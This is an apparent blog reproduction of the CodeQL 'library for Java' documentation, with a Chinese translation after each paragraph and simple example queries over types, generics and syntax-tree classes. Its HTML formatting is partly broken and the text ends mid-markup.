    <content type="html"><![CDATA[<h1 id="CodeQL-library-for-Java¶"><a href="#CodeQL-library-for-Java¶" class="headerlink" title="CodeQL library for Java¶"></a>CodeQL library for Java<a href="https://codeql.github.com/docs/codeql-language-guides/codeql-library-for-java/#codeql-library-for-java" target="_blank" rel="noopener">¶</a></h1><p>When you’re analyzing a Java program, you can make use of the large collection of classes in the CodeQL library for Java.</p><blockquote><p>当你在分析一个Java程序时，你可以利用Java的CodeQL库中的大量类的集合。</p></blockquote><h2 id="About-the-CodeQL-library-for-Java"><a href="#About-the-CodeQL-library-for-Java" class="headerlink" title="About the CodeQL library for Java"></a>About the CodeQL library for Java</h2><p>There is an extensive library for analyzing CodeQL databases extracted from Java projects. The classes in this library present the data from a database in an object-oriented form and provide abstractions and predicates to help you with common analysis tasks.</p><blockquote><p>有一个广泛的库用于分析从Java项目中提取的CodeQL数据库。该库中的类以面向对象的形式呈现数据库中的数据，并提供抽象和谓词来帮助你完成常见的分析任务。</p></blockquote><p>The library is implemented as a set of QL modules, that is, files with the extension <code>.qll</code>. The module <code>java.qll</code> imports all the core Java library modules, so you can include the complete library by beginning your query with:</p><blockquote><p>该库以一组QL模块的形式实现，也就是扩展名为.qll的文件。java.qll模块导入了所有的核心Java库模块，所以你可以通过以以下方式开始查询来包含完整的库。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br></pre></td></tr></table></figure><p>The rest of this article briefly summarizes the most important classes and predicates provided by this library.</p><blockquote><p>本文其余部分简要总结了这个库提供的最重要的类和谓词。</p></blockquote><blockquote><p>Note</p><p>The example queries in this article illustrate the types of results returned by different library classes. The results themselves are not interesting but can be used as the basis for developing a more complex query. The other articles in this section of the help show how you can take a simple query and fine-tune it to find precisely the results you’re interested in.</p><p>本文的示例查询说明了不同库类返回的结果类型。这些结果本身并不有趣，但可以作为开发更复杂查询的基础。本节帮助中的其他文章展示了如何将一个简单的查询进行微调，以精确地找到你感兴趣的结果。</p></blockquote><h2 id="Summary-of-the-library-classes"><a href="#Summary-of-the-library-classes" class="headerlink" title="Summary of the library classes"></a>Summary of the library classes</h2><p>The most important classes in the standard Java library can be grouped into five main categories:</p><blockquote><p>标准Java库中最重要的类可以分为五大类。</p></blockquote><ol><li><p>Classes for representing program elements (such as classes and methods)</p><blockquote><p>代表程序元素的类（如类和方法）。</p></blockquote></li><li><p>Classes for representing AST nodes (such as statements and expressions)</p><blockquote><p>用于表示AST节点（如语句和表达式）的类。</p></blockquote></li><li><p>Classes for representing metadata (such as annotations and comments)</p><blockquote><p>用于表示元数据（如注释和评论）的类。</p></blockquote></li><li><p>Classes for computing metrics (such as cyclomatic complexity and coupling)</p><blockquote><p>计算度量的类（如循环复杂度和耦合度</p></blockquote></li><li><p>Classes for navigating the program’s call graph</p><blockquote><p>用于导航程序的调用图的类。</p></blockquote></li></ol><p>We will discuss each of these in turn, briefly describing the most important classes for each category.</p><blockquote><p>我们将依次讨论这些内容，简要介绍每一类最重要的类别。</p></blockquote><h2 id="Program-elements"><a href="#Program-elements" class="headerlink" title="Program elements"></a>Program elements</h2><p>These classes represent named program elements: packages (<code>Package</code>), compilation units (<code>CompilationUnit</code>), types (<code>Type</code>), methods (<code>Method</code>), constructors (<code>Constructor</code>), and variables (<code>Variable</code>).</p><blockquote><p>这些类表示命名的程序元素：包（Package）、编译单元（CompilationUnit）、类型（Type）、方法（Method）、构造器（Constructor）和变量（Variable）。</p></blockquote><p>Their common superclass is <code>Element</code>, which provides general member predicates for determining the name of a program element and checking whether two elements are nested inside each other.</p><blockquote><p>它们共同的超类是Element，它提供了一般的成员谓词，用于确定程序元素的名称和检查两个元素内部是否相互嵌套。</p></blockquote><p>It’s often convenient to refer to an element that might either be a method or a constructor; the class <code>Callable</code>, which is a common superclass of <code>Method</code> and <code>Constructor</code>, can be used for this purpose.</p><blockquote><p>通常，引用一个可能是方法或构造函数的元素是很方便的；类Callable是Method和Constructor的共同超类，可以用于这个目的。</p></blockquote><h3 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h3><p>Class <code>Type</code> has a number of subclasses for representing different kinds of types:</p><blockquote><p>类Type有许多子类，用于表示不同种类的类型:</p></blockquote><ul><li><p><code>PrimitiveType</code> represents a <a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html" target="_blank" rel="noopener">primitive type</a>, that is, one of <code>boolean</code>, <code>byte</code>, <code>char</code>, <code>double</code>, <code>float</code>, <code>int</code>, <code>long</code>, <code>short</code>; QL also classifies <code>void</code> and <code>&lt;nulltype&gt;</code> (the type of the <code>null</code> literal) as primitive types.</p><blockquote><p>PrimitiveType表示一个基元类型，即布尔、字节、char、double、float、int、long、short中的一种；QL还将void和<nulltype>（null文字的类型）归为基本类型。    </nulltype></p></blockquote></li><li><pre><code>  RefType  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    represents a reference (that is, non-primitive) type; it in turn has several subclasses:</span><br><span class="line"></span><br><span class="line">    &gt;  代表一个引用（即非基本）类型；它又有几个子类：</span><br><span class="line"></span><br><span class="line">    * &#96;Class&#96; represents a Java class. Class代表一个Java类。</span><br><span class="line">    * &#96;Interface&#96; represents a Java interface.  Interface代表一个Java接口。</span><br><span class="line">    * &#96;EnumType&#96; represents a Java &#96;enum&#96; type.  EnumType代表一个Java枚举类型。</span><br><span class="line">    * &#96;Array&#96; represents a Java array type. Array代表一个Java数组类型。</span><br><span class="line"></span><br><span class="line">For example, the following query finds all variables of type &#96;int&#96; in the program:</span><br><span class="line"></span><br><span class="line">&gt; 例如，下面的查询可以找到程序中所有类型为int的变量:</span><br></pre></td></tr></table></figure>import java</code></pre></li></ul><p>from Variable v, PrimitiveType pt<br>where pt = v.getType() and<br>    pt.hasName(“int”)<br>select v</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;860076406167044435&#x2F;). You’re likely to get many results when you run this query because most projects contain many variables of type &#96;int&#96;.</span><br><span class="line"></span><br><span class="line">&gt;  在LGTM.com的查询控制台中可以看到。运行此查询时，很可能会得到许多结果，因为大多数项目都包含许多类型为int的变量。</span><br><span class="line"></span><br><span class="line">![image-20210319172755510](https:&#x2F;&#x2F;gitee.com&#x2F;samny&#x2F;images&#x2F;raw&#x2F;master&#x2F;55u27er55ec&#x2F;55u27er55ec.png)</span><br><span class="line"></span><br><span class="line">Reference types are also categorized according to their declaration scope:</span><br><span class="line"></span><br><span class="line">&gt; 引用类型也根据其声明范围进行分类:</span><br><span class="line"></span><br><span class="line">* &#96;TopLevelType&#96; represents a reference type declared at the top-level of a compilation unit.</span><br><span class="line"></span><br><span class="line">    &gt; TopLevelType表示在编译单元的顶层声明的引用类型。</span><br><span class="line"></span><br><span class="line">* &#96;NestedType&#96; is a type declared inside another type.</span><br><span class="line"></span><br><span class="line">    &gt; NestedType是在另一个类型里面声明的类型。</span><br><span class="line"></span><br><span class="line">For instance, this query finds all top-level types whose name is not the same as that of their compilation unit:</span><br><span class="line"></span><br><span class="line">&gt; 例如，这个查询可以找到所有名称与其编译单元名称不同的顶层类型:</span><br></pre></td></tr></table></figure><p>import java</p><p>from TopLevelType tl<br>where tl.getName() != tl.getCompilationUnit().getName()<br>select tl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;4340983612585284460&#x2F;). This pattern is seen in many projects. When we ran it on the LGTM.com demo projects, most of the projects had at least one instance of this problem in the source code. There were many more instances in the files referenced by the source code.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。这种模式在很多项目中都能看到。当我们在LGTM.com演示项目上运行时，大多数项目的源代码中至少有一个这种问题的实例。在源代码引用的文件中，还有很多实例。</span><br><span class="line"></span><br><span class="line">![image-20210319172840606](https:&#x2F;&#x2F;gitee.com&#x2F;samny&#x2F;images&#x2F;raw&#x2F;master&#x2F;40u28er40ec&#x2F;40u28er40ec.png)</span><br><span class="line"></span><br><span class="line">Several more specialized classes are available as well:</span><br><span class="line"></span><br><span class="line">&gt; 有几个更专业的类。</span><br><span class="line"></span><br><span class="line">* &#96;TopLevelClass&#96; represents a class declared at the top-level of a compilation unit.</span><br><span class="line"></span><br><span class="line">    &gt; TopLevelClass表示在编译单元的顶层声明的类。</span><br><span class="line"></span><br><span class="line">* &#96;NestedClass&#96;represents a class declared inside another type , such as:</span><br><span class="line"></span><br><span class="line">    &gt; NestedClass代表一个在另一个类型里面声明的类，如:</span><br><span class="line"></span><br><span class="line">    * A &#96;LocalClass&#96;, which is [a class declared inside a method or constructor](https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;java&#x2F;javaOO&#x2F;localclasses.html).</span><br><span class="line"></span><br><span class="line">        &gt; LocalClass是一个在方法或构造函数里面声明的类。</span><br><span class="line"></span><br><span class="line">    * An &#96;AnonymousClass&#96;, which is an [anonymous class](https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;java&#x2F;javaOO&#x2F;anonymousclasses.html).</span><br><span class="line"></span><br><span class="line">        &gt; AnonymousClass是一个匿名类。</span><br><span class="line"></span><br><span class="line">Finally, the library also has a number of singleton classes that wrap frequently used Java standard library classes: &#96;TypeObject&#96;, &#96;TypeCloneable&#96;, &#96;TypeRuntime&#96;, &#96;TypeSerializable&#96;, &#96;TypeString&#96;, &#96;TypeSystem&#96; and &#96;TypeClass&#96;. Each CodeQL class represents the standard Java class suggested by its name.</span><br><span class="line"></span><br><span class="line">&gt; 最后，该库还有一些单子类，这些单子类包裹了常用的Java标准库类。TypeObject、TypeCloneable、TypeRuntime、TypeSerializable、TypeString、TypeSystem和TypeClass。每一个CodeQL类都代表了其名称所建议的标准Java类。</span><br><span class="line"></span><br><span class="line">As an example, we can write a query that finds all nested classes that directly extend &#96;Object&#96;:</span><br><span class="line"></span><br><span class="line">&gt; 作为一个例子，我们可以写一个查询，找到所有直接扩展Object的嵌套类:</span><br></pre></td></tr></table></figure><p>import java</p><p>from NestedClass nc<br>where nc.getASupertype() instanceof TypeObject<br>select nc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;8482509736206423238&#x2F;). You’re likely to get many results when you run this query because many projects include nested classes that extend &#96;Object&#96; directly.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。运行此查询时，可能会得到许多结果，因为许多项目都包含直接扩展 Object 的嵌套类。 </span><br><span class="line"></span><br><span class="line">![image-20210320173224433](https:&#x2F;&#x2F;gitee.com&#x2F;samny&#x2F;images&#x2F;raw&#x2F;master&#x2F;24u32er24ec&#x2F;24u32er24ec.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Generics</span><br><span class="line"></span><br><span class="line">There are also several subclasses of &#96;Type&#96; for dealing with generic types.</span><br><span class="line"></span><br><span class="line">&gt; Type还有几个子类用于处理通用类型。</span><br><span class="line"></span><br><span class="line">A &#96;GenericType&#96; is either a &#96;GenericInterface&#96; or a &#96;GenericClass&#96;. It represents a generic type declaration such as interface &#96;java.util.Map&#96; from the Java standard library:</span><br><span class="line"></span><br><span class="line">&gt; 一个GenericType是一个GenericInterface或一个GenericClass。它代表一个通用类型声明，如Java标准库中的java.util.Map接口:</span><br></pre></td></tr></table></figure><p>package java.util.;</p><p>public interface Map&lt;K, V&gt; {<br>    int size();</p><pre><code>// ...</code></pre><p>}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Type parameters, such as &#96;K&#96; and &#96;V&#96; in this example, are represented by class &#96;TypeVariable&#96;.</span><br><span class="line"></span><br><span class="line">&gt; 类型参数，如本例中的K和V，由类TypeVariable表示。</span><br><span class="line"></span><br><span class="line">A parameterized instance of a generic type provides a concrete type to instantiate the type parameter with, as in &#96;Map&lt;String, File&gt;&#96;. Such a type is represented by a &#96;ParameterizedType&#96;, which is distinct from the &#96;GenericType&#96; representing the generic type it was instantiated from. To go from a &#96;ParameterizedType&#96; to its corresponding &#96;GenericType&#96;, you can use predicate &#96;getSourceDeclaration&#96;.</span><br><span class="line"></span><br><span class="line">&gt; 一个通用类型的参数化实例提供了一个具体的类型来实例化类型参数，如Map&lt;String, File&gt;。这样的类型由ParameterizedType表示，它与代表它被实例化的通用类型的GenericType不同。要从一个ParameterizedType到它对应的GenericType，可以使用谓词getSourceDeclaration。</span><br><span class="line"></span><br><span class="line">For instance, we could use the following query to find all parameterized instances of &#96;java.util.Map&#96;:</span><br><span class="line"></span><br><span class="line">&gt; 例如，我们可以使用下面的查询来查找 java.util.Map.的所有参数化实例:</span><br></pre></td></tr></table></figure><p>import java</p><p>from GenericInterface map, ParameterizedType pt<br>where map.hasQualifiedName(“java.util”, “Map”) and<br>    pt.getSourceDeclaration() = map<br>select pt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;7863873821043873550&#x2F;). None of the LGTM.com demo projects contain parameterized instances of &#96;java.util.Map&#96; in their source code, but they all have results in reference files.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。LGTM.com 演示项目的源代码中都不包含 java.util.Map 的参数化实例，但它们在参考文件中都有结果。</span><br><span class="line"></span><br><span class="line">![image-20210320173428831](https:&#x2F;&#x2F;gitee.com&#x2F;samny&#x2F;images&#x2F;raw&#x2F;master&#x2F;28u34er28ec&#x2F;28u34er28ec.png)</span><br><span class="line"></span><br><span class="line">In general, generic types may restrict which types a type parameter can be bound to. For instance, a type of maps from strings to numbers could be declared as follows:</span><br><span class="line"></span><br><span class="line">&gt; 一般来说，通用类型可能会限制类型参数可以绑定到哪些类型。例如，从字符串到数字的映射类型可以声明如下:</span><br></pre></td></tr></table></figure><p>class StringToNumMap<N extends number> implements Map&lt;String, N&gt; {<br>    // …<br>}</N></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">This means that a parameterized instance of &#96;StringToNumberMap&#96; can only instantiate type parameter &#96;N&#96; with type &#96;Number&#96; or one of its subtypes but not, for example, with &#96;File&#96;. We say that N is a bounded type parameter, with &#96;Number&#96; as its upper bound. In QL, a type variable can be queried for its type bound using predicate &#96;getATypeBound&#96;. The type bounds themselves are represented by class &#96;TypeBound&#96;, which has a member predicate &#96;getType&#96; to retrieve the type the variable is bounded by.</span><br><span class="line"></span><br><span class="line">&gt; 这意味着StringToNumberMap的参数化实例只能用Number类型或它的一个子类型实例化类型参数N，而不能用例如File类型实例化类型参数N。我们说N是一个有界的类型参数，Number是它的上界。在QL中，可以使用谓词getATypeBound查询一个类型变量的类型边界。类型约束本身由类TypeBound表示，它有一个成员谓词getType来检索变量被约束的类型。</span><br><span class="line"></span><br><span class="line">As an example, the following query finds all type variables with type bound &#96;Number&#96;:</span><br><span class="line"></span><br><span class="line">&gt; 作为一个例子，下面的查询可以找到所有类型绑定Number的类型变量:</span><br></pre></td></tr></table></figure><p>import java</p><p>from TypeVariable tv, TypeBound tb<br>where tb = tv.getATypeBound() and<br>    tb.getType().hasQualifiedName(“java.lang”, “Number”)<br>select tv</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;6740696080876162817&#x2F;). When we ran it on the LGTM.com demo projects, the *neo4j&#x2F;neo4j*, *hibernate&#x2F;hibernate-orm* and *apache&#x2F;hadoop* projects all contained examples of this pattern.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。当我们在LGTM.com的演示项目上运行时，neo4j&#x2F;neo4j、hibernate&#x2F;hibernate-orm和apache&#x2F;hadoop项目都包含了这种模式的例子。</span><br><span class="line"></span><br><span class="line">For dealing with legacy code that is unaware of generics, every generic type has a “raw” version without any type parameters. In the CodeQL libraries, raw types are represented using class &#96;RawType&#96;, which has the expected subclasses &#96;RawClass&#96; and &#96;RawInterface&#96;. Again, there is a predicate &#96;getSourceDeclaration&#96; for obtaining the corresponding generic type. As an example, we can find variables of (raw) type &#96;Map&#96;:</span><br><span class="line"></span><br><span class="line">&gt; 对于处理不了解泛型的遗留代码，每个泛型都有一个没有任何类型参数的 &quot;原始 &quot;版本。在CodeQL库中，原始类型用类RawType表示，它有预期的子类RawClass和RawInterface。同样，有一个谓词getSourceDeclaration用于获取相应的通用类型。作为一个例子，我们可以找到（原始）类型Map的变量:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Variable v, RawType rt<br>where rt = v.getType() and<br>    rt.getSourceDeclaration().hasQualifiedName(“java.util”, “Map”)<br>select v</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;4032913402499547882&#x2F;). Many projects have variables of raw type &#96;Map&#96;.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。许多项目都有原始类型Map的变量。</span><br><span class="line"></span><br><span class="line">For example, in the following code snippet this query would find &#96;m1&#96;, but not &#96;m2&#96;:</span><br><span class="line"></span><br><span class="line">&gt; 例如，在下面的代码片段中，这个查询将找到 m1，但找不到 m2:</span><br></pre></td></tr></table></figure><p>Map m1 = new HashMap();<br>Map&lt;String, String&gt; m2 = new HashMap&lt;String, String&gt;();</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Finally, variables can be declared to be of a [wildcard type](https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;java&#x2F;generics&#x2F;wildcards.html):</span><br><span class="line"></span><br><span class="line">&gt; 最后，变量可以被声明为通配符类型:</span><br></pre></td></tr></table></figure><p>Map&lt;? extends Number, ? super Float&gt; m;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">The wildcards &#96;? extends Number&#96; and &#96;? super Float&#96; are represented by class &#96;WildcardTypeAccess&#96;. Like type parameters, wildcards may have type bounds. Unlike type parameters, wildcards can have upper bounds (as in &#96;? extends Number&#96;), and also lower bounds (as in &#96;? super Float&#96;). Class &#96;WildcardTypeAccess&#96; provides member predicates &#96;getUpperBound&#96; and &#96;getLowerBound&#96; to retrieve the upper and lower bounds, respectively.</span><br><span class="line"></span><br><span class="line">&gt; 通配符? extends Number和? super Float由类WildcardTypeAccess表示。和类型参数一样，通配符可以有类型边界。与类型参数不同的是，通配符可以有上界（如?extends Number），也可以有下界（如?super Float）。类WildcardTypeAccess提供了成员谓词getUpperBound和getLowerBound来分别检索上界和下界。</span><br><span class="line"></span><br><span class="line">For dealing with generic methods, there are classes &#96;GenericMethod&#96;, &#96;ParameterizedMethod&#96; and &#96;RawMethod&#96;, which are entirely analogous to the like-named classes for representing generic types.</span><br><span class="line"></span><br><span class="line">&gt; 对于处理通用方法，有GenericMethod、ParameterizedMethod和RawMethod等类，它们完全类似于表示通用类型的同名类。</span><br><span class="line"></span><br><span class="line">For more information on working with types, see the [Types in Java](https:&#x2F;&#x2F;codeql.github.com&#x2F;docs&#x2F;codeql-language-guides&#x2F;types-in-java&#x2F;).</span><br><span class="line"></span><br><span class="line">&gt; 有关使用类型的更多信息，请参阅Java中的类型。</span><br><span class="line"></span><br><span class="line">### Variables</span><br><span class="line"></span><br><span class="line">Class &#96;Variable&#96; represents a variable [in the Java sense](https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;java&#x2F;nutsandbolts&#x2F;variables.html), which is either a member field of a class (whether static or not), or a local variable, or a parameter. Consequently, there are three subclasses catering to these special cases:</span><br><span class="line"></span><br><span class="line">&gt; 类变量表示Java意义上的变量，它既可以是一个类的成员字段（不管是静态的还是非静态的），也可以是一个局部变量，或者是一个参数。因此，有三个子类迎合了这些特殊情况:</span><br><span class="line"></span><br><span class="line">* &#96;Field&#96; represents a Java field. Field代表一个Java字段。</span><br><span class="line">* &#96;LocalVariableDecl&#96; represents a local variable.  LocalVariableDecl代表一个局部变量。</span><br><span class="line">* &#96;Parameter&#96; represents a parameter of a method or constructor. Parameter代表一个方法或构造函数的参数。</span><br><span class="line"></span><br><span class="line">## Abstract syntax tree</span><br><span class="line"></span><br><span class="line">Classes in this category represent abstract syntax tree (AST) nodes, that is, statements (class &#96;Stmt&#96;) and expressions (class &#96;Expr&#96;). For a full list of expression and statement types available in the standard QL library, see “[Abstract syntax tree classes for working with Java programs](https:&#x2F;&#x2F;codeql.github.com&#x2F;docs&#x2F;codeql-language-guides&#x2F;abstract-syntax-tree-classes-for-working-with-java-programs&#x2F;).”</span><br><span class="line"></span><br><span class="line">&gt; 这一类的类代表抽象语法树（AST）节点，即语句（类Stmt）和表达式（类Expr）。关于标准QL库中可用的表达式和语句类型的完整列表，请参见 &quot;用于处理Java程序的抽象语法树类&quot;。</span><br><span class="line"></span><br><span class="line">Both &#96;Expr&#96; and &#96;Stmt&#96; provide member predicates for exploring the abstract syntax tree of a program:</span><br><span class="line"></span><br><span class="line">&gt; Expr和Stmt都提供了用于探索程序的抽象语法树的成员谓词。</span><br><span class="line"></span><br><span class="line">* &#96;Expr.getAChildExpr&#96; returns a sub-expression of a given expression. </span><br><span class="line"></span><br><span class="line">    &gt; Expr.getAChildExpr返回一个给定表达式的子表达式。</span><br><span class="line"></span><br><span class="line">* &#96;Stmt.getAChild&#96; returns a statement or expression that is nested directly inside a given statement.</span><br><span class="line"></span><br><span class="line">    &gt; Stmt.getAChild返回一个直接嵌套在给定语句中的语句或表达式。</span><br><span class="line"></span><br><span class="line">* &#96;Expr.getParent&#96; and &#96;Stmt.getParent&#96; return the parent node of an AST node.</span><br><span class="line"></span><br><span class="line">    &gt; Expr.getParent和Stmt.getParent返回一个AST节点的父节点。</span><br><span class="line"></span><br><span class="line">For example, the following query finds all expressions whose parents are &#96;return&#96; statements:</span><br><span class="line"></span><br><span class="line">&gt; 例如，下面的查询可以找到所有父母是返回语句的表达式:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Expr e<br>where e.getParent() instanceof ReturnStmt<br>select e</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;1947757851560375919&#x2F;). Many projects have examples of &#96;return&#96; statements with child expressions.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。很多项目都有返回语句与子表达式的例子。</span><br><span class="line"></span><br><span class="line">Therefore, if the program contains a return statement &#96;return x + y;&#96;, this query will return &#96;x + y&#96;.</span><br><span class="line"></span><br><span class="line">&gt; 因此，如果程序中包含一个返回语句return x + y;，这个查询将返回x + y。</span><br><span class="line"></span><br><span class="line">As another example, the following query finds statements whose parent is an &#96;if&#96; statement:</span><br><span class="line"></span><br><span class="line">&gt; 作为另一个例子，下面的查询可以找到父语句是if语句的语句:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Stmt s<br>where s.getParent() instanceof IfStmt<br>select s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;1989464153689219612&#x2F;). Many projects have examples of &#96;if&#96; statements with child statements.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。很多项目都有if语句与子语句的例子。</span><br><span class="line"></span><br><span class="line">This query will find both &#96;then&#96; branches and &#96;else&#96; branches of all &#96;if&#96; statements in the program.</span><br><span class="line"></span><br><span class="line">&gt; 这个查询可以找到程序中所有if语句的then分支和 else分支。</span><br><span class="line"></span><br><span class="line">Finally, here is a query that finds method bodies:</span><br><span class="line"></span><br><span class="line">&gt; 最后，这里是一个查找方法体的查询:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Stmt s<br>where s.getParent() instanceof Method<br>select s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 